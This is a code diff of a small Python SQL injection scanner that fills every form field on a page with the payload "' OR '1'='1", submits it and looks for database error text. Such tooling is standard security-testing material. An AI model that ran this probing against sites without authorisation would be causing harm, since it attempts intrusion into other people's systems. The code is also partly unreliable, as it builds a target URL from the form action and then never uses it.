@@ -1,27 +1,42 @@
 import requests
+from bs4 import BeautifulSoup
 
-def scan_sql_injection(urls):
+def scan_sql_injection(url_list):
     payload = "' OR '1'='1"
-    vulnerable_urls = []
+    vulnerable = []
 
-    for url in urls:
+    for url in url_list:
         try:
-            test_url = url + payload
-            response = requests.get(test_url, timeout=5)
+            res = requests.get(url)
+            soup = BeautifulSoup(res.text, "html.parser")
 
-            content = response.text.lower()
+            forms = soup.find_all("form")
 
-            # Common SQL error keywords
-            if (
-                "sql" in content or
-                "mysql" in content or
-                "syntax error" in content or
-                "warning" in content
-            ):
-                vulnerable_urls.append(url)
+            for form in forms:
+                action = form.get("action")
+                method = form.get("method", "get").lower()
 
-        except Exception:
-            # Ignore broken links or timeouts
-            pass
+                inputs = form.find_all("input")
 
-    return vulnerable_urls
+                data = {}
+                for inp in inputs:
+                    name = inp.get("name")
+                    if name:
+                        data[name] = payload
+
+                target = url if not action else url + action
+
+                if method == "post":
+                    response = requests.post(url, data=data)
+                else:
+                    response = requests.get(url, params=data)
+
+                content = response.text.lower()
+
+                if "sql syntax" in content or "database error" in content:
+                    vulnerable.append(url)
+
+        except Exception as e:
+            print("Error scanning:", url)
+
+    return vulnerable
